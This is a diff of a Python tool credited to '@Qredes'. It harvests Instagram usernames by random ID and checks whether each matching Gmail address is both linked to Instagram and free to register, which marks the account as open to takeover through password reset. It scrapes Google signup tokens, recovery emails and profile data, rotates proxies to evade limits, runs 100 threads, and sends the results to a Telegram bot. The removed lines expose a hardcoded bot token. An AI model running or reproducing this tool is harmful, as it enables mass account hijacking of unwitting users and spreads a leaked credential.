@@ -1,28 +1,84 @@
 import os
-os.system("pip install colorama")
-from requests import get,post
-from concurrent.futures import ThreadPoolExecutor
-from user_agent import generate_user_agent
-from os import system,remove,name
-from colorama import Fore, Style
-from rich.console import Console
+try:
+  from rich.console import Console
+  from rich.live import Live
+except:
+  os.system("pip install rich")
+  from rich.console import Console
+  from rich.live import Live
+try:
+  import requests
+except:
+  os.system("pip install requests")
+  import requests
+try:
+  from user_agent import generate_user_agent
+except:
+  os.system("pip install user_agent")
+  from user_agent import generate_user_agent
+try:
+  from time import time
+except:
+  os.system("pip install time")
+  from time import time
+try:
+  from hashlib import md5
+except:
+  os.system("pip install hashlib")
+  from hashlib import md5
+try:
+  from uuid import uuid4
+except:
+  os.system("pip install uuid")
+  from uuid import uuid4
+try:
+  from random import randrange,choice
+except:
+  os.system("pip install random")
+  from random import randrange,choice
+try:
+  from concurrent.futures import ThreadPoolExecutor
+except:
+  os.system("pip install concurrent.futures")
+  from concurrent.futures import ThreadPoolExecutor
+import http.client
+import json,httpx
+def get1():
+    conn = http.client.HTTPSConnection("gimmeproxy.com")
+    conn.request("GET", "/api/getProxy?websites=google")
+    res = conn.getresponse()
+    data = res.read().decode("utf-8")
+    json_data = json.loads(data)
+    conn.close()
+    return ({'http://': json_data['curl'],'https://': json_data['curl']})
+hits=0
+bads_instgram=0
+bads_email=0
+BLUE = '\033[94m'
+RESET = '\033[0m'
+BOLD = '\033[1m'
+YELLOW = '\033[93m'
+RED = '\033[91m'
+GREEN = '\033[92m'
+CYAN = '\033[96m'
+MAGENTA = '\033[95m'
+ID = input(f"{YELLOW}{BOLD}ID :  ")
+token = input(f"{RED}{BOLD}Token : ")
+#def namefile():
+#  while True:
+#    try:
+#      namefile1=input(f"{GREEN}{BOLD}name file : ")
+   #   namefile1='qq'
+#      ooo=open(namefile1,"r").read().splitlines()
+#      return ooo
+#    except:
+#      print(f"{RED}{BOLD}File Not Found")
+#list99=namefile()
 from requests import post as pp
 from user_agent import generate_user_agent as gg
 from random import choice as cc
 from random import randrange as rr
 import re
-import requests
-from hashlib import md5
-from time import time
-#------------------------------------------------------------#
-lenked_instgram=0
-unlenked_instgram=0
-available_gmail=0
-unavailable_gmail=0
-number_check=0
-orange_color = '\033[38;5;214m'
-console = Console()
-#------------------------------------------------------------#
 yy='azertyuiopmlkjhgfdsqwxcvbn'
 ids=[]
 def tll():
@@ -56,7 +112,7 @@ def tll():
     }
 
 
-    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
+    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3,proxies=get1())
     tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
     cookies={
       '__Host-GAPS':host
@@ -79,15 +135,16 @@ def tll():
       'https://accounts.google.com/_/signup/validatepersonaldetails',
       cookies=cookies,
       headers=headers,
-      data=data,
+      data=data,proxies=get1()
   )
     tl=str(response.text).split('",null,"')[1].split('"')[0]
     host=response.cookies.get_dict()['__Host-GAPS']
-    try:remove('tl.txt')
+    try:os.remove('tl.txt')
     except:pass
     with open('tl.txt','a') as f:
       f.write(tl+'//'+host+'\n')
   except Exception as e:
+    print(e)
     tll()
 tll()
 def check_gmail(email):
@@ -122,7 +179,7 @@ def check_gmail(email):
     params=params,
     cookies=cookies,
     headers=headers,
-    data=data,
+    data=data,proxies=get1()
   )
     if '"gf.uar",1' in str(response.text):return 'good'
     elif '"er",null,null,null,null,400' in str(response.text):
@@ -130,12 +187,8 @@ def check_gmail(email):
       check_gmail(email)
     else:return 'bad'
   except:check_gmail(email)
-#---------------------------[input]----------------------------#
-ID=749219602
-system('cls' if name == 'nt' else 'clear')
-token="6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo"
-system('cls' if name == 'nt' else 'clear')
-#---------------------------[info]-----------------------------#
+
+os.system('clear')
 def rest(user):
   try:
     headers = {
@@ -163,12 +216,12 @@ def rest(user):
     'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
     'ig_sig_key_version': '4',
   }
-    response =post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
+    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,proxies=get1()).json()
     r=response['email']
   except:
     r='h h h'
   return r
-def info(username,domen):
+def info(username,jj):
   global hits
   headers = {
       'Accept': '*/*',
@@ -180,15 +233,15 @@ def info(username,domen):
       'Sec-Fetch-Dest': 'empty',
       'Sec-Fetch-Mode': 'cors',
       'Sec-Fetch-Site': 'cross-site',
-      'User-Agent': generate_user_agent(),
+      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/124.0.0.0',
   }
-
   params = {
       'username': username,
   }
+  hits+=1
 
   try:
-    response = get('https://instaskull.com/tucktools_user', params=params, headers=headers).json()
+    response = requests.get('https://instaskull.com/tucktools_user', params=params, headers=headers).json()
     id=response['id']
     name=response['user_fullname']  
     user_followers=response['user_followers']
@@ -196,7 +249,7 @@ def info(username,domen):
     total_posts=response['total_posts']
     user_description=response['user_description']
     try:
-      date=get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
+      date=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
     except:
       date='None'
     tlg = f'''
@@ -206,7 +259,7 @@ folowers : {user_followers}
 following : {user_following}
 total posts : {total_posts}
 username : {username}
-email : {username}@{domen}
+email : {username}@{jj}
 date : {date}
 id : {id}
 name : {name}
@@ -215,36 +268,47 @@ rest : {rest(username)}
 ᯓᯓᯓᯓᯓᯓᯓᯓ
 by : @Qredes
 '''
-    print(tlg)
+   # print(BLUE+tlg)
     with open('hits1.txt','a') as ff:
       ff.write(f'{tlg}\n')
-    try:get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
     except:pass
   except:
     tlg = f'''
     ⌯ Hi Qredes Got Hit
     ᯓᯓᯓᯓᯓᯓᯓᯓ
     username : {username}
-    email : {username}@{domen}
+    email : {username}@{jj}
     rest : {rest(username)}
     ᯓᯓᯓᯓᯓᯓᯓᯓ
     by : @Qredes
     '''
-    print(tlg)
-    try:get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+  #  print(BLUE+tlg)
+    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
     except:pass
     with open('hits1.txt','a') as ff:
       ff.write(f'{tlg}\n')
-
-def h_h(email):
-  global lenked_instgram, unlenked_instgram, available_gmail, unavailable_gmail
-  username, domen = email.split('@')
+def Qredes(email):
+  global bads_email
   try:
-      if check_gmail(username) == 'good':
-        available_gmail += 1
-        csrftoken = md5(str(time()).encode()).hexdigest()
-        ua=generate_user_agent()
-        headers = {
+
+    if 'good' == check_gmail(email):
+        username,jj=email.split('@')
+        info(username,jj)
+    else:bads_email+=1
+  except:''
+    #Qredes(email)
+def check(email):
+  global bads_instgram,hits,bads_email
+  try:
+    csrftoken = md5(str(time()).encode()).hexdigest()
+    ua=generate_user_agent()
+    pp=choice('001')
+    os.system('clear' if os.name == 'posix' else 'cls')
+    tt=(f"\r{GREEN}Hits:{GREEN} {hits} {RED}Bad instgram:{RED} {bads_instgram} {YELLOW}Email Not Available:{YELLOW} {bads_email}")
+    print(tt)
+    if pp == '0':
+      headers = {
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9',
         'content-type': 'application/x-www-form-urlencoded',
@@ -252,53 +316,68 @@ def h_h(email):
         'referer': 'https://www.instagram.com/accounts/signup/email/',
         'user-agent': ua,
         'x-csrftoken': csrftoken
-        }
-        data = {
+    }
+      data = {
         'email': email,
-        }
-        response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
-        if 'email_is_taken' in str(response.text):
-              lenked_instgram += 1
-              info(username, domen)
-        else:unlenked_instgram += 1
-      else:unavailable_gmail += 1
-  except Exception as e:''
-  console.clear()
-  ss = f'''
-  [green]linked instgram:[/] {lenked_instgram}
-  [orange]avilible gmail:[/] {available_gmail}
-  [red]unlinked instgram:[/] {unlenked_instgram}
-  [yellow]unavailable gmail:[/] {unavailable_gmail}
-
-  BY : @Qredes / @K_Q_A / قريديس 
-  '''
-  console.print(ss)
-def main():
-  while True:
-    try:
-      id = str(rr(10000,23282097))
-      lsd=''.join(cc('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(22))
+    }
+      response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data,proxies=get1())
+   #   print(response.text)
+      if 'email_is_taken' in str(response.text):Qredes(email)
+      else:bads_instgram+=1
+    elif pp == '1':
       headers = {
-          'authority': 'www.instagram.com',
           'accept': '*/*',
           'accept-language': 'en-US,en;q=0.9',
           'content-type': 'application/x-www-form-urlencoded',
           'origin': 'https://www.instagram.com',
-          'referer': 'https://www.instagram.com/0s9s/',
-          'sec-fetch-site': 'same-origin',
-          'user-agent': generate_user_agent(),
-          'x-fb-lsd': lsd,
+          'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
+          'user-agent': ua,
+          'x-csrftoken': csrftoken,
       }
       data = {
-          'lsd': lsd,
-          'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
-          'doc_id': '8257302777620075',
+          'username': email,
       }
+      response = requests.post(
+          'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+          headers=headers,
+          data=data,proxies=get1()
+      ).text
+   #   print(str(response))
+      if '"user":true' in response:Qredes(email)
+      else:bads_instgram+=1
+  except:''
+   # check(email)
+  os.system('clear' if os.name == 'posix' else 'cls')
+  tt=(f"\r{GREEN}Hits:{GREEN} {hits} {RED}Bad instgram:{RED} {bads_instgram} {YELLOW}Email Not Available:{YELLOW} {bads_email}")
+  print(tt)
 
-      username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']
+
+
+def qqq():
+  while True:
+    try:
+      lsd=''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
+      id=str(randrange(10000,739988755))
+      headers = {
+      'accept': '*/*',
+      'accept-language': 'en-US,en;q=0.9',
+      'content-type': 'application/x-www-form-urlencoded',
+      'origin': 'https://www.instagram.com',
+      'referer': 'https://www.instagram.com/0s9s/',
+      'user-agent': str(generate_user_agent()),
+      'x-fb-lsd': 'qredes'+lsd,
+  }
+      data = {
+      'lsd': 'qredes'+lsd,
+      'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
+      'doc_id': '7397388303713986',
+  }
+      username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data,proxies=get1()).json()['data']['user']['username']#['@Qredes']
       email=username+'@gmail.com'
-      h_h(email)
+      check(email)
     except:''
 from threading import Thread
-for _ in range(70):
-  Thread(target=main).start()
+for _ in range(100):
+  Thread(target=qqq).start()
+
+# by @Qredes
